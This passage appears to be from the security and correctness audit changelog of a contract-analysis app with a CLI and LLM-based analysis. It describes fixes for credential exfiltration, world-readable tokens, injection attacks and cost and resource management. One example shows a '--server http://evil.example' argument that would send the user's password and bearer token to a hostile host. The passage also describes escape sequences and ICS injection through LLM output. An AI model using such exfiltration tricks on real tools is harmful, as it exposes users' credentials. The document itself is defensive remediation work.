- **Retrieval failure was invisible.** A blanket `except Exception` meant an expired `HUGGINGFACEHUB_API_TOKEN` permanently downgraded semantic search to keyword matching — and `keyword_fallback` returned *the first k chunks* when nothing matched, presenting arbitrary passages to the model as the authoritative excerpts. The except is narrowed to real retrieval errors, logged at ERROR, the response is tagged `degraded`, and a no-match fallback now returns `[]` so the honest "no match" answer is used.
- **Non-ASCII header crashed signature checks.** `hmac.compare_digest` raises `TypeError` on non-ASCII `str`; Starlette decodes headers as latin-1, so one byte in `X-Razorpay-Signature` or `x-reminder-secret` turned a clean 401/400 into a 500 with a stack trace. Both sites (plus the same bug reachable via the `/verify` body) now compare bytes.
- **CLI sent credentials wherever it was told.** `--server` accepted any string *and persisted it*, so one copy-pasted `--server http://evil.example` exfiltrated the password and bearer token on that run and every run after. URLs are now validated (`https` required; `http` only for loopback), `--server` is per-invocation, and persisting requires an explicit `config set-server`. Token harvesting from `Set-Cookie` was likewise unconditional — any response, including a 4xx from a hostile host, could pin a token; it is now restricted to successful login/signup responses and validated as a JWT shape.
- **CLI wrote the session token world-readable.** `Conf` was constructed without `configFileMode`, so the temp file and the final config existed at 0644 on every write before the `chmod` fix-up ran — and that fix-up no-oped entirely on a fresh machine. Now created 0600 from the start. Exported reports (full contract text) also get 0600, and the export path check no longer rejects legitimate `..name` files nor follows a symlink out of the working directory.
- **Terminal escape injection in the CLI.** Server/LLM text went to `console.log` raw; `\s` doesn't cover ESC, so escape sequences survived truncation and could rewrite already-printed lines. Control characters are now stripped at the layout chokepoints, before chalk adds its own colours.
- **Unique indexes could fail to build silently.** The `payments.razorpayPaymentId` index is the *only* thing making a duplicate webhook non-double-granting, and `users.email` is the only real guard behind signup's check-then-insert — yet a failed build was logged and swallowed, booting a healthy-looking app with both guarantees off. Correctness-critical indexes now fail startup; performance-only ones still degrade quietly.
- **ICS injection.** LLM-generated text went into `SUMMARY:`/`DESCRIPTION:` unescaped, so a newline in model output could terminate the property and inject entire extra `VEVENT`s into the user's calendar. Now escaped per RFC 5545.

### Fixed — cost, correctness and resource management

- **A single request could monopolise the whole LLM budget.** A 600k-char document yielded ~330 chunks, each analysed *and* summarised through a process-wide `Semaphore(2)` with the summaries strictly serial — 20+ minutes of wall clock during which every other user was blocked, for one quota unit. Work is now capped (150 chunks, 40 summaries), runs concurrently behind a bounded gate, and the synthesis prompt — previously every clause in the document, unbounded — is truncated to a fixed budget.
- **Failed chunks vanished from the report.** A chunk whose JSON didn't parse was dropped with a warning, and the failure count was only consulted when *every* chunk failed — so 200 of 330 chunks could fail and the user still read "This document has been fully analyzed". Chunks are retried, the request refuses outright above a 40% failure ratio, and the response carries additive `partial` / `analyzedSections` / `unanalyzedSections` fields. `asyncio.gather` also no longer discards every completed chunk's paid-for work when one chunk raises.
- **A JSON array from the model crashed the request** after the entire analysis was already billed — `parsed["chunkSummaries"] = []` on a list raises `TypeError`. Non-dict shapes now raise a handled error and wrong field types are coerced rather than thrown away.
- **Groq clients leaked on every call.** A fresh `ChatGroq` per invocation builds *two* never-closed httpx pools, so one large analysis leaked ~600 socket sets and paid a fresh TLS handshake every time. Now one cached client per (key, model, temperature) — with the api key first in the cache key, preserving the dedicated per-feature keys and their separate rate limits and semaphores. The retry loop also no longer holds a concurrency permit while sleeping, clamps a hostile `Retry-After` to 60s, and retries connection/timeout/5xx errors instead of only 429s.
- **A hung embedding provider took down email.** `InferenceClient` had no timeout (defaults to waiting forever) and ran on the default `to_thread` executor — the same pool `send_email` uses. Embeddings now have a 30s timeout and a dedicated bounded executor.
- **Reminder counts lied.** Counters incremented *before* `insert_one`, and a swallowed write failure still reported the reminder as scheduled. Counters now increment only on success, with a separate `failed` count.
- **Signed-in users were bounced from `/upload` and `/analysis`.** Both redirected on `!user` without waiting for `authReady` — the exact bug fixed on other routes in `bf65eaf`, missed on these two. The full analysis record (including document text) was also written to sessionStorage with no quota handling, throwing `QuotaExceededError` on large contracts *after* a successful analysis; writes now fall back to passing the id and refetching.
- **Uploads weren't size-checked unless they were images**, so a 200 MB PDF transferred in full before the server rejected it — and drag-and-drop bypassed the `accept` filter entirely. Both are now validated client-side against the real backend limits.
- Plus: an absolute 30-day session ceiling that `/auth/me` re-issuance preserves (a captured token could previously be renewed forever); `pro` on `/auth/login` and `/auth/me` now derived from `effective_plan` so a lapsed subscriber stops seeing Pro UI; an aggregate cap on negotiation points (50 × 4 × 20k = ~4M chars could reach the model on one free-tier call); backend security headers, since CSP and friends previously existed only on the Next rewrite path; HSTS and `Permissions-Policy`; a SHA-256 verification gate on the Gitleaks download, previously `curl | tar` as root; an out-of-order-response guard on the lawyer directory; timeouts on every CLI request; RFC 5545 escaping; timezone-aware `createdAt`; `Decimal` money in receipts; escaped receipt fields; and a batch of React lifecycle leaks (uncleaned timers, unhandled `clipboard.writeText` rejections, a mutate-then-copy `Map` state update, a toast timer re-armed on every render).

### Open — requires action outside the codebase

- **A MongoDB Atlas connection string with embedded credentials remains reachable in git history** (commit `a8cfcd7`, `server/src/index.ts`), and `.gitleaks.toml` allowlists that commit — so the scanner passes green while the credential stays cloneable. The allowlist comment already admits it "does NOT fix the leak". This needs credential rotation first, then a history rewrite and force-push; both are destructive and outward-facing, so neither was done here.

---

*Generated 2026-08-01; audit section added 2026-08-16. Reflects the codebase at commit `b2610bd` plus the audit fixes. Test counts verified by run: 415 backend (pytest), 33 frontend (vitest); ruff check/format, `tsc --noEmit` and `next lint` all clean.*
